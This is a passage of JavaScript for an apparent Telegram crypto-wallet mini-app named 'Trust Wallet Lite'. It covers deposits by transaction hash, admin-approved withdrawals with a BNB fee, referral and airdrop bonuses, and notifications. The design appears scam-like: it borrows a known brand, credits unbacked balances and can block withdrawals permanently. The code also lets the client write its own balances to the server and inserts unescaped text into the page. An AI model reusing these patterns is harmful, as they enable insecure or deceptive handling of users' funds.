            <div class="feature"><i class="fas fa-exchange-alt"></i><span>Coming Soon</span></div>
        </div>
    `;
}

function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="showNotifications()"><i class="fas fa-bell"></i><div><div class="label">${t('notifications.title')}</div><div class="desc">View all notifications</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="showHistory()"><i class="fas fa-history"></i><div><div class="label">${t('actions.history')}</div><div class="desc">View all transactions</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleLanguage()"><i class="fas fa-language"></i><div><div class="label">${t('settings.language')}</div><div class="desc">${currentLanguage === 'en' ? 'English / العربية' : 'العربية / English'}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item" onclick="toggleTheme()"><i class="fas fa-moon"></i><div><div class="label">${t('settings.theme')}</div><div class="desc">${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}</div></div><i class="fas fa-chevron-right"></i></div>
            <div class="settings-item logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i><div><div class="label">${t('settings.logout')}</div><div class="desc">Sign out of your wallet</div></div></div>
        </div>
    `;
}

// ====== 12. HISTORY FUNCTIONS ======
let currentHistoryFilter = 'all';

function renderHistory(filter = 'all') {
    const historyList = document.getElementById('historyList');
    if (!historyList) return;
    
    currentHistoryFilter = filter;
    
    let transactions = loadLocalTransactions();
    
    if (filter !== 'all') {
        transactions = transactions.filter(tx => tx.type === filter);
    }
    
    if (transactions.length === 0) {
        historyList.innerHTML = `
            <div class="empty-state">
                <i class="fa-regular fa-clock"></i>
                <p>No transactions yet</p>
                <span>Your transactions will appear here</span>
            </div>
        `;
        return;
    }
    
    historyList.innerHTML = transactions.map(tx => {
        const date = new Date(tx.timestamp);
        const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        
        let icon = 'fa-circle-down';
        let typeClass = 'deposit';
        let typeText = 'Deposit';
        
        if (tx.type === 'withdraw') {
            icon = 'fa-circle-up';
            typeClass = 'withdraw';
            typeText = 'Withdrawal';
        } else if (tx.type === 'swap') {
            icon = 'fa-arrow-right-arrow-left';
            typeClass = 'swap';
            typeText = 'Swap';
        } else if (tx.type === 'referral_bonus') {
            icon = 'fa-users';
            typeClass = 'referral';
            typeText = 'Referral Bonus';
        }
        
        let statusClass = 'completed';
        let statusText = 'Completed';
        
        if (tx.status === 'pending') {
            statusClass = 'pending';
            statusText = 'Pending';
        } else if (tx.status === 'rejected') {
            statusClass = 'rejected';
            statusText = 'Rejected';
        }
        
        return `
            <div class="history-item">
                <div class="history-item-header">
                    <div class="history-type ${typeClass}">
                        <i class="fa-regular ${icon}"></i>
                        <span>${typeText}</span>
                    </div>
                    <span class="history-status ${statusClass}">${statusText}</span>
                </div>
                <div class="history-details">
                    <span class="history-amount">${tx.amount} ${tx.currency}</span>
                    <span class="history-date">${formattedDate}</span>
                </div>
                ${tx.details ? `<div style="font-size: 11px; color: var(--text-secondary); margin-top: 5px;">${tx.details}</div>` : ''}
                ${tx.reason ? `<div style="font-size: 10px; color: var(--danger); margin-top: 5px;">Reason: ${tx.reason}</div>` : ''}
            </div>
        `;
    }).join('');
}

function filterHistory(filter) {
    document.querySelectorAll('.history-tab').forEach(tab => {
        tab.classList.remove('active');
    });
    event.target.classList.add('active');
    renderHistory(filter);
}

function showHistory() {
    currentPage = 'history';
    const modal = document.getElementById('historyModal');
    
    const header = modal.querySelector('.modal-header');
    let refreshBtn = header.querySelector('.refresh-history-btn');
    
    if (!refreshBtn) {
        refreshBtn = document.createElement('button');
        refreshBtn.className = 'refresh-history-btn';
        refreshBtn.innerHTML = '<i class="fa-solid fa-rotate-right"></i>';
        refreshBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            this.querySelector('i').classList.add('fa-spin');
            lastHistoryCheckTime = 0;
            checkPendingTransactions().finally(() => {
                setTimeout(() => {
                    this.querySelector('i').classList.remove('fa-spin');
                }, 1000);
            });
        };
        refreshBtn.style.marginLeft = '10px';
        refreshBtn.style.background = 'transparent';
        refreshBtn.style.border = 'none';
        refreshBtn.style.color = 'var(--pink-1)';
        refreshBtn.style.fontSize = '16px';
        refreshBtn.style.cursor = 'pointer';
        refreshBtn.title = 'Check for updates';
        header.appendChild(refreshBtn);
        console.log("✅ History refresh button added");
    }
    
    modal.classList.add('show');
    
    setTimeout(() => {
        checkPendingTransactions();
    }, 500);
    
    renderHistory('all');
    animateElement('.modal-content', 'slideUpModal');
}

// ====== 13. NOTIFICATIONS FUNCTIONS ======
function renderNotifications() {
    const notificationsList = document.getElementById('notificationsList');
    if (!notificationsList || !userData) return;
    
    const notifications = userData.notifications || [];
    
    let controlsHTML = `
        <div style="display: flex; gap: 10px; margin-bottom: 15px; padding: 0 5px;">
            <button onclick="clearReadNotifications()" style="flex: 1; padding: 8px; background: rgba(0,212,255,0.1); border: 1px solid rgba(0,212,255,0.2); border-radius: 8px; color: var(--quantum-blue); font-size: 12px; cursor: pointer;">
                <i class="fa-regular fa-trash-can"></i> ${t('notifications.clear_read')}
            </button>
            <button onclick="clearAllNotifications()" style="flex: 1; padding: 8px; background: rgba(255,68,68,0.1); border: 1px solid rgba(255,68,68,0.2); border-radius: 8px; color: #ff4444; font-size: 12px; cursor: pointer;">
                <i class="fa-regular fa-bell-slash"></i> ${t('notifications.clear_all')}
            </button>
        </div>
    `;
    
    if (notifications.length === 0) {
        notificationsList.innerHTML = controlsHTML + `
            <div class="empty-state">
                <i class="fa-regular fa-bell-slash"></i>
                <p>${t('notifications.no_notifications')}</p>
                <span>We'll notify you when something arrives</span>
            </div>
        `;
        return;
    }
    
    notifications.sort((a, b) => {
        const timeA = a.timestamp?.toDate ? a.timestamp.toDate().getTime() : new Date(a.timestamp).getTime();
        const timeB = b.timestamp?.toDate ? b.timestamp.toDate().getTime() : new Date(b.timestamp).getTime();
        return timeB - timeA;
    });
    
    let notificationsHTML = '';
    notifications.forEach(notif => {
        let date = new Date();
        if (notif.timestamp?.toDate) date = notif.timestamp.toDate();
        else if (notif.timestamp) date = new Date(notif.timestamp);
        
        const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        const unreadClass = notif.read ? '' : 'unread';
        
        let icon = 'fa-bell';
        if (notif.type === 'success') icon = 'fa-circle-check';
        if (notif.type === 'error') icon = 'fa-circle-xmark';
        
        notificationsHTML += `
            <div class="notification-item ${unreadClass}" onclick="markNotificationRead('${notif.id}')">
                <div class="notification-header">
                    <span class="notification-title">
                        <i class="fa-regular ${icon}"></i>
                        ${t('notifications.title')}
                    </span>
                    <span class="notification-time">${formattedDate}</span>
                </div>
                <div class="notification-message">
                    ${notif.message}
                </div>
            </div>
        `;
    });
    
    notificationsList.innerHTML = controlsHTML + notificationsHTML;
}

async function markNotificationRead(notificationId) {
    if (!userData.notifications) return;
    
    const notification = userData.notifications.find(n => n.id === notificationId);
    if (notification && !notification.read) {
        notification.read = true;
        updateNotificationBadge();
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        
        if (db) {
            try {
                await db.collection('users').doc(userId).update({
                    notifications: userData.notifications
                });
            } catch (error) {
                console.error("❌ Error updating notification in Firebase:", error);
            }
        }
        
        renderNotifications();
    }
}

function clearReadNotifications() {
    if (!userData.notifications || userData.notifications.length === 0) {
        showToast(t('notifications.no_notifications'), 'info');
        return;
    }
    
    const readCount = userData.notifications.filter(n => n.read).length;
    const unreadCount = userData.notifications.filter(n => !n.read).length;
    
    if (readCount === 0) {
        showToast(t('notifications.no_read'), 'info');
        return;
    }
    
    if (confirm(t('notifications.confirm_clear_read', { count: readCount, unread: unreadCount }))) {
        userData.notifications = userData.notifications.filter(n => !n.read);
        updateNotificationBadge();
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        
        if (db) {
            db.collection('users').doc(userId).update({
                notifications: userData.notifications
            }).catch(console.error);
        }
        
        renderNotifications();
        showToast(t('notifications.cleared', { count: readCount }), 'success');
    }
}

function clearAllNotifications() {
    if (!userData.notifications || userData.notifications.length === 0) {
        showToast(t('notifications.no_notifications'), 'info');
        return;
    }
    
    const unreadCount = userData.notifications.filter(n => !n.read).length;
    
    if (unreadCount > 0) {
        if (!confirm(t('notifications.confirm_clear_all_unread', { count: unreadCount }))) return;
    } else {
        if (!confirm(t('notifications.confirm_clear_all'))) return;
    }
    
    userData.notifications = [];
    updateNotificationBadge();
    localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
    
    if (db) {
        db.collection('users').doc(userId).update({
            notifications: []
        }).catch(console.error);
    }
    
    renderNotifications();
    showToast(t('notifications.cleared', { count: 'all' }), 'success');
}

function showNotifications() {
    console.log("🔔 Opening notifications modal");
    
    const modal = document.getElementById('notificationsModal');
    if (!modal) {
        console.error("❌ Notifications modal not found");
        showToast("Notifications modal not found", "error");
        return;
    }
    
    modal.classList.add('show');
    renderNotifications();
    animateElement('.modal-content', 'slideUpModal');
}

function updateNotificationBadge() {
    const badge = document.querySelector('.badge');
    if (badge && userData) {
        const unread = userData.notifications?.filter(n => !n.read).length || 0;
        badge.textContent = unread;
        badge.style.display = unread > 0 ? 'block' : 'none';
    }
}

// ====== 14. DEPOSIT FUNCTIONS (مع CoinPayments) ======
async function showDepositModal() {
    console.log("💰 Opening deposit modal...");
    const modal = document.getElementById('depositModal');
    modal.classList.add('show');
    
    const currency = document.getElementById('depositCurrency').value;
    updateDepositInfo();
    
    const addressSpan = document.getElementById('depositAddress');
    if (addressSpan && userData && userData.depositAddress) {
        addressSpan.innerText = userData.depositAddress;
    } else if (addressSpan && userData) {
        addressSpan.innerText = 'Loading address...';
        
        try {
            const response = await apiCall('/deposit-address', 'POST', { userId, currency });
            
            if (response.address) {
                userData.depositAddress = response.address;
                saveUserData();
                addressSpan.innerText = response.address;
            } else {
                addressSpan.innerText = 'Failed to generate address';
            }
        } catch (error) {
            console.error("Error getting deposit address:", error);
            addressSpan.innerText = 'Error loading address';
        }
    }
}

function updateDepositInfo() {
    const currency = document.getElementById('depositCurrency').value;
    const depositIcon = document.getElementById('depositIcon');
    const minEl = document.getElementById('depositMinAmount');
    const amountInput = document.getElementById('depositAmount');
    const hashHint = document.getElementById('hashFormatHint');
    
    if (depositIcon) depositIcon.src = getCurrencyIcon(currency);
    
    const minAmount = DEPOSIT_MINIMUMS[currency] || 10;
    if (minEl) minEl.textContent = `${minAmount} ${currency}`;
    
    if (currency === 'TWT' || currency === 'SHIB' || currency === 'PEPE') {
        amountInput.placeholder = `Min ${minAmount.toLocaleString()} ${currency}`;
        amountInput.step = '1';
    } else if (currency === 'USDT') {
        amountInput.placeholder = `Min ${minAmount} ${currency}`;
        amountInput.step = '0.01';
    } else {
        amountInput.placeholder = `Min ${minAmount} ${currency}`;
        amountInput.step = '0.000001';
    }
    
    if (hashHint) hashHint.textContent = 'BSC/ETH format: 0x... (66 characters)';
}

function copyDepositAddress() {
    const address = document.getElementById('depositAddress').innerText;
    if (address && address !== 'Loading address...' && address !== 'Error loading address') {
        copyToClipboard(address);
        showToast(t('success.addressCopied'), 'success');
    }
}

function validateTransactionHashInput() {
    const hashInput = document.getElementById('txnId');
    const hintEl = document.getElementById('hashValidationHint');
    const submitBtn = document.getElementById('submitDepositBtn');
    
    if (!hashInput || !hintEl || !submitBtn) return;
    
    const hash = hashInput.value.trim();
    
    if (!hash) {
        hintEl.style.display = 'none';
        submitBtn.disabled = true;
        return;
    }
    
    const isValid = hash.startsWith('0x') && hash.length === 66;
    const message = isValid ? '✓ Valid BSC/ETH transaction hash' : 'Invalid format. Must start with 0x and be 66 characters';
    
    const isUsed = userData.usedHashes?.includes(hash.toLowerCase());
    
    if (!isValid) {
        hintEl.textContent = message;
        hintEl.className = 'hash-validation-hint invalid';
        hintEl.style.display = 'block';
        submitBtn.disabled = true;
    } else if (isUsed) {
        hintEl.textContent = 'This transaction hash has already been used';
        hintEl.className = 'hash-validation-hint invalid';
        hintEl.style.display = 'block';
        submitBtn.disabled = true;
    } else {
        hintEl.textContent = message;
        hintEl.className = 'hash-validation-hint valid';
        hintEl.style.display = 'block';
        submitBtn.disabled = false;
    }
}

async function submitDeposit() {
    const currency = document.getElementById('depositCurrency').value;
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const txnId = document.getElementById('txnId').value.trim();
    
    if (!amount || amount <= 0) {
        showToast(t('error.enterAmount'), 'error');
        return;
    }
    
    if (!txnId) {
        showToast('Please enter transaction ID', 'error');
        return;
    }
    
    if (!txnId.startsWith('0x') || txnId.length !== 66) {
        showToast(t('error.invalidHash'), 'error');
        return;
    }
    
    if (userData.usedHashes?.includes(txnId.toLowerCase())) {
        showToast(t('error.hashUsed'), 'error');
        return;
    }
    
    const minAmount = DEPOSIT_MINIMUMS[currency] || 0;
    if (amount < minAmount) {
        showToast(t('error.minDeposit', { min: minAmount.toLocaleString(), currency }), 'error');
        return;
    }
    
    const depositRequest = {
        customId: 'deposit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        userId: userId,
        userName: userName,
        currency: currency,
        amount: amount,
        txnId: txnId,
        address: userData.depositAddress || DEPOSIT_ADDRESSES[currency],
        status: 'pending',
        timestamp: new Date().toISOString(),
        type: 'deposit'
    };
    
    const submitBtn = document.getElementById('submitDepositBtn');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    }
    
    try {
        if (!userData.usedHashes) userData.usedHashes = [];
        userData.usedHashes.push(txnId.toLowerCase());
        
        let firebaseId = null;
        
        if (db) {
            const docRef = await db.collection('deposit_requests').add(depositRequest);
            console.log("✅ Deposit saved with Firebase ID:", docRef.id);
            firebaseId = docRef.id;
            
            await db.collection('users').doc(userId).update({
                usedHashes: userData.usedHashes
            });
            
            await addNotification(ADMIN_ID, `💰 New deposit request: ${amount} ${currency} from ${userId}`, 'info');
            
            startOnDemandListener('deposit_requests', docRef.id, (data) => {
                console.log("📥 Deposit update received:", data);
                
                if (data.status === 'approved') {
                    userData.balances[currency] = (userData.balances[currency] || 0) + amount;
                    localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
                    
                    addTransaction({ ...depositRequest, firebaseId: docRef.id, status: 'approved' });
                    showToast(t('notif.depositApproved', { amount, currency }), 'success');
                    updateUI();
                } else if (data.status === 'rejected') {
                    addTransaction({ ...depositRequest, firebaseId: docRef.id, status: 'rejected', reason: data.reason || 'Unknown reason' });
                    showToast(t('notif.depositRejected', { reason: data.reason || 'Unknown reason' }), 'error');
                }
            }, 30000);
        }
        
        const transactionToAdd = { ...depositRequest, firebaseId: firebaseId || 'temp_' + Date.now() };
        setTimeout(() => addTransaction(transactionToAdd), 100);
        
        showToast(t('success.depositSubmitted', { amount, currency }), 'success');
        closeModal('depositModal');
        
        document.getElementById('depositAmount').value = '';
        document.getElementById('txnId').value = '';
        
        if (submitBtn) {
            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Deposit';
            }, 1000);
        }
        
    } catch (error) {
        console.error("❌ Deposit error:", error);
        showToast('❌ Failed to submit deposit request: ' + error.message, 'error');
        
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Deposit';
        }
    }
}

// ====== 15. WITHDRAW FUNCTIONS ======
function checkWithdrawFee() {
    const currency = document.getElementById('withdrawCurrency').value;
    const feeWarning = document.getElementById('feeWarning');
    const feeWarningText = document.getElementById('feeWarningText');
    const networkFee = document.getElementById('networkFee');
    const receiveAmount = document.getElementById('receiveAmount_');
    const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
    
    updateWithdrawIcon();
    
    if (currency === 'USDT') {
        feeWarning.classList.remove('hidden');
        feeWarningText.textContent = 'USDT withdrawal requires 0.00016 BNB fee';
        networkFee.textContent = '0.00016 BNB';
        if (receiveAmount) receiveAmount.textContent = amount.toFixed(2) + ' USDT';
    } else if (currency === 'BNB') {
        feeWarning.classList.remove('hidden');
        feeWarningText.textContent = 'BNB withdrawal requires 0.0005 BNB fee';
        networkFee.textContent = '0.0005 BNB';
        if (receiveAmount) receiveAmount.textContent = (amount - 0.0005).toFixed(4) + ' BNB';
    } else {
        feeWarning.classList.add('hidden');
        networkFee.textContent = '0 BNB';
        if (receiveAmount) receiveAmount.textContent = amount.toFixed(6) + ' ' + currency;
    }
}

function updateWithdrawIcon() {
    const currency = document.getElementById('withdrawCurrency').value;
    const icon = document.getElementById('withdrawIcon');
    if (icon) icon.src = getCurrencyIcon(currency);
}

function validateWithdrawAddressInput() {
    const addressInput = document.getElementById('walletAddress');
    const hintEl = document.getElementById('withdrawAddressHint');
    const submitBtn = document.getElementById('submitWithdrawBtn');
    
    if (!addressInput || !hintEl || !submitBtn) return;
    
    const address = addressInput.value.trim();
    
    if (!address) {
        hintEl.style.display = 'none';
        submitBtn.disabled = true;
        return;
    }
    
    const isValid = address.startsWith('0x') && address.length === 42;
    
    if (!isValid) {
        hintEl.textContent = 'Invalid address. Must start with 0x and be 42 characters';
        hintEl.className = 'address-validation-hint invalid';
        hintEl.style.display = 'block';
        submitBtn.disabled = true;
    } else {
        hintEl.textContent = '✓ Valid address';
        hintEl.className = 'address-validation-hint valid';
        hintEl.style.display = 'block';
        submitBtn.disabled = false;
    }
}

async function submitWithdraw() {
    if (userData && userData.withdrawBlocked === true) {
        showToast('⛔ Your account is permanently blocked from withdrawals. Contact support.', 'error');
        return;
    }
    
    const currency = document.getElementById('withdrawCurrency').value;
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('walletAddress').value.trim();
    
    if (!amount || amount <= 0 || !address) {
        showToast('Please fill all fields', 'error');
        return;
    }
    
    if (!address.startsWith('0x') || address.length !== 42) {
        showToast('Invalid wallet address', 'error');
        return;
    }
    
    const minAmounts = { USDT: 10, TWT: 1000000, BNB: 0.02 };
    const minForCurrency = minAmounts[currency];
    if (minForCurrency && amount < minForCurrency) {
        showToast(`Minimum withdrawal is ${minForCurrency} ${currency}`, 'error');
        return;
    }
    
    if (!userData.balances[currency] || userData.balances[currency] < amount) {
        showToast(`Insufficient ${currency} balance`, 'error');
        return;
    }
    
    let fee = 0;
    let feeCurrency = 'BNB';
    
    if (currency === 'USDT') {
        fee = 0.00016;
        if (!userData.balances.BNB || userData.balances.BNB < fee) {
            showToast(`You need ${fee} BNB for withdrawal fee`, 'error');
            return;
        }
    } else if (currency === 'BNB') {
        fee = 0.0005;
        if (!userData.balances.BNB || userData.balances.BNB < (amount + fee)) {
            showToast(`Insufficient BNB balance including fee`, 'error');
            return;
        }
    }
    
    const submitBtn = document.getElementById('submitWithdrawBtn');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
    }
    
    userData.balances[currency] -= amount;
    if (fee > 0) userData.balances[feeCurrency] -= fee;
    
    localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
    
    const withdrawRequest = {
        customId: 'withdraw_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        userId: userId,
        userName: userName,
        currency: currency,
        amount: amount,
        address: address,
        fee: fee,
        feeCurrency: feeCurrency,
        status: 'pending',
        timestamp: new Date().toISOString(),
        type: 'withdraw'
    };
    
    try {
        let firebaseId = null;
        
        if (db) {
            const docRef = await db.collection('withdrawals').add(withdrawRequest);
            console.log("✅ Withdrawal saved with Firebase ID:", docRef.id);
            firebaseId = docRef.id;
            
            await db.collection('users').doc(userId).update({
                balances: userData.balances
            });
            
            await addNotification(ADMIN_ID, `💸 New withdrawal request: ${amount} ${currency} from ${userId}`, 'info');
            
            startOnDemandListener('withdrawals', docRef.id, (data) => {
                console.log("📤 Withdrawal update received:", data);
                
                if (data.status === 'approved') {
                    addTransaction({ ...withdrawRequest, firebaseId: docRef.id, status: 'approved' });
                    showToast(`✅ Your withdrawal of ${amount} ${currency} has been approved!`, 'success');
                } else if (data.status === 'rejected') {
                    userData.balances[currency] += amount;
                    if (fee > 0) userData.balances[feeCurrency] += fee;
                    localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
                    addTransaction({ ...withdrawRequest, firebaseId: docRef.id, status: 'rejected', reason: data.reason || 'Unknown reason' });
                    showToast(`❌ Your withdrawal was rejected: ${data.reason || 'Unknown reason'}`, 'error');
                    updateUI();
                }
            }, 30000);
        }
        
        const transactionToAdd = { ...withdrawRequest, firebaseId: firebaseId || 'temp_' + Date.now() };
        setTimeout(() => addTransaction(transactionToAdd), 100);
        
        showToast(`✅ Withdrawal request submitted for ${amount} ${currency}`, 'success');
        closeModal('withdrawModal');
        
        document.getElementById('withdrawAmount').value = '';
        document.getElementById('walletAddress').value = '';
        updateUI();
        
        if (submitBtn) {
            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Withdrawal';
            }, 1000);
        }
        
    } catch (error) {
        console.error("❌ Withdraw error:", error);
        showToast('❌ Failed to submit withdrawal request: ' + error.message, 'error');
        
        userData.balances[currency] += amount;
        if (fee > 0) userData.balances[feeCurrency] += fee;
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Withdrawal';
        }
    }
}

// ====== 16. PENDING TRANSACTIONS CHECKER ======
async function checkPendingTransactions() {
    if (!db || !userData) return;
    
    const now = Date.now();
    if (now - lastHistoryCheckTime < HISTORY_CACHE_TIME) {
        console.log("📦 Using cached history (less than 10 minutes old)");
        return;
    }
    lastHistoryCheckTime = now;
    
    console.log("🔍 Checking for updated pending transactions...");
    
    const localTransactions = loadLocalTransactions();
    const pendingTxs = localTransactions.filter(tx => 
        (tx.type === 'deposit' || tx.type === 'withdraw') && 
        tx.status === 'pending' &&
        tx.firebaseId && !tx.firebaseId.startsWith('temp_')
    );
    
    if (pendingTxs.length === 0) {
        console.log("✅ No pending transactions to check");
        return;
    }
    
    console.log(`⏳ Found ${pendingTxs.length} pending transactions, checking status...`);
    let updated = false;
    
    for (const tx of pendingTxs) {
        try {
            const collection = tx.type === 'deposit' ? 'deposit_requests' : 'withdrawals';
            const docRef = db.collection(collection).doc(tx.firebaseId);
            const docSnap = await docRef.get();
            
            if (!docSnap.exists) continue;
            
            const data = docSnap.data();
            
            if (data.status !== tx.status) {
                console.log(`🔄 Transaction ${tx.firebaseId} status changed: ${tx.status} → ${data.status}`);
                
                const allTxs = loadLocalTransactions();
                const index = allTxs.findIndex(t => t.firebaseId === tx.firebaseId);
                
                if (index !== -1) {
                    allTxs[index] = { ...allTxs[index], ...data, status: data.status };
                    saveLocalTransactions(allTxs);
                    
                    if (userData.transactions) {
                        const userIndex = userData.transactions.findIndex(t => t.firebaseId === tx.firebaseId);
                        if (userIndex !== -1) {
                            userData.transactions[userIndex] = { ...userData.transactions[userIndex], ...data, status: data.status };
                        }
                    }
                    
                    if (data.status === 'approved' && tx.type === 'deposit') {
                        userData.balances[tx.currency] = (userData.balances[tx.currency] || 0) + tx.amount;
                        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
                        showToast(`✅ Your ${tx.amount} ${tx.currency} deposit has been approved!`, 'success');
                    }
                    
                    if (data.status === 'rejected' && tx.type === 'withdraw') {
                        userData.balances[tx.currency] = (userData.balances[tx.currency] || 0) + tx.amount;
                        if (tx.fee) userData.balances[tx.feeCurrency] = (userData.balances[tx.feeCurrency] || 0) + tx.fee;
                        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
                        showToast(`❌ Your withdrawal was rejected: ${data.reason || 'Unknown reason'}`, 'error');
                    }
                    
                    updated = true;
                }
            }
        } catch (error) {
            console.error(`❌ Error checking transaction ${tx.firebaseId}:`, error);
        }
    }
    
    if (updated) {
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        
        if (currentPage === 'history' || document.getElementById('historyModal')?.classList.contains('show')) {
            renderHistory(currentHistoryFilter);
        }
        
        updateUI();
        showToast('✅ Transaction history updated!', 'success');
    }
}

// ====== 17. LOAD USER DATA ======
async function loadUserData(force = false) {
    try {
        console.log("📂 Loading user data for:", userId);
        
        const now = Date.now();
        const localData = localStorage.getItem(`user_${userId}`);
        
        if (!force && localData && (now - lastUserLoadTime) < USER_CACHE_TIME) {
            userData = JSON.parse(localData);
            console.log("✅ Using cached user data (less than 5 min old)");
            updateUI();
            updateNotificationBadge();
            checkAdminAndAddCrown();
            return;
        }
        
        if (localData) {
            userData = JSON.parse(localData);
            console.log("📦 Using localStorage data while fetching fresh data");
        }
        
        if (db) {
            console.log("🔥 Loading from Firebase via backend...");
            
            const response = await apiCall(`/users/${userId}`);
            
            if (response.success && response.data) {
                userData = response.data;
                console.log("✅ Data loaded from backend API");
            } else if (!userData) {
                console.log("📝 No user found, showing onboarding");
                return;
            }
            
            lastUserLoadTime = now;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        }
        
        userData.transactions = loadLocalTransactions();
        
        updateUI();
        updateNotificationBadge();
        checkAdminAndAddCrown();
        
        if (hasReferralCode() && !userData.invitedBy) {
            await processReferral();
        }
        
        const onboarding = document.getElementById('onboardingScreen');
        const mainContent = document.getElementById('mainContent');
        if (onboarding && userData) onboarding.style.display = 'none';
        if (mainContent && userData) mainContent.style.display = 'block';
        
    } catch (error) {
        console.error("❌ Error loading user data:", error);
    }
}

function hasReferralCode() {
    return !!(startParam);
}

async function processReferral() {
    try {
        const referralCode = startParam;
        if (!referralCode || referralCode === userId || userData?.invitedBy) return;
        
        console.log("🎯 Processing referral code:", referralCode);
        
        const response = await apiCall('/referrals', 'POST', { referrerId: referralCode, newUserId: userId });
        
        if (response.success) {
            userData.invitedBy = referralCode;
            userData.balances.USDT = (userData.balances.USDT || 0) + REFERRAL_BONUS;
            userData.totalUsdtEarned = (userData.totalUsdtEarned || 0) + REFERRAL_BONUS;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            updateUI();
            showToast(`🎉 +${REFERRAL_BONUS} USDT from referral!`, 'success');
        }
    } catch (error) {
        console.error("Referral error:", error);
    }
}

async function claimReferralMilestone(referrals) {
    const milestone = userData.referralMilestones?.find(x => x.referrals === referrals);
    if (!milestone || milestone.claimed) return;
    if (userData.inviteCount < referrals) {
        showToast(`Need ${referrals} referrals`, 'error');
        return;
    }
    const reward = REFERRAL_MILESTONES.find(x => x.referrals === referrals).reward;
    userData.balances.USDT += reward;
    userData.totalUsdtEarned += reward;
    milestone.claimed = true;
    saveUserData();
    renderAirdrop();
    renderWallet();
    updateTotalBalance();
    showToast(`Claimed ${reward} USDT!`);
}

function copyInviteLink() {
    copyToClipboard(`${BOT_LINK}?startapp=${userId}`);
}

function shareReferral() {
    const text = `🚀 Join Trust Wallet Lite and get ${AIRDROP_BONUS} USDT Airdrop! Use my link: ${BOT_LINK}?startapp=${userId}`;
    if (tg?.shareToStory) tg.shareToStory(text);
    else copyToClipboard(text);
}

async function addNotification(targetUserId, message, type = 'info') {
    if (!db) return;
    
    const notification = {
        id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
        message: message,
        type: type,
        read: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        await db.collection('users').doc(targetUserId).update({
            notifications: firebase.firestore.FieldValue.arrayUnion(notification)
        });
        
        if (targetUserId === userData?.userId) {
            if (!userData.notifications) userData.notifications = [];
            userData.notifications.push(notification);
            updateNotificationBadge();
            showToast(message, type);
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        }
        
        console.log("✅ Notification added:", notification);
    } catch (error) {
        console.error("❌ Error adding notification:", error);
    }
}

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
        apiCall(`/users/${userId}`, 'PATCH', { updates: userData });
    }
}

async function createNewWallet() {
    console.log("🔄 Creating new wallet...");
    const btn = document.getElementById('createWalletBtn');
    if (btn) {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
        btn.disabled = true;
    }
    
    try {
        const newUserData = {
            userId: userId,
            userName: userName,
            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, SHIB: 0, PEPE: 0 },
            inviteCount: 0,
            invitedBy: null,
            totalUsdtEarned: AIRDROP_BONUS,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [{ id: Date.now().toString(), message: '🎉 Welcome! +10 USDT', read: false, timestamp: new Date().toISOString() }],
            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        const response = await apiCall('/users', 'POST', { userId, userData: newUserData });
        
        if (response.success) {
            userData = newUserData;
            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
            console.log("✅ User created successfully");
            
            const onboarding = document.getElementById('onboardingScreen');
            const mainContent = document.getElementById('mainContent');
            if (onboarding) onboarding.style.display = 'none';
            if (mainContent) mainContent.style.display = 'block';
            
            updateUI();
            showToast('✅ Wallet created! +10 USDT');
            
            if (startParam && startParam !== userId) {
                await processReferral();
            }
        } else {
            throw new Error(response.error);
        }
        
    } catch (error) {
        console.error("Error creating user:", error);
        showToast('Failed to create wallet', 'error');
    } finally {
        if (btn) {
            btn.innerHTML = 'Create a new wallet';
            btn.disabled = false;
        }
    }
}

function showImportModal() {
    const modal = document.getElementById('importModal');
    if (modal) {
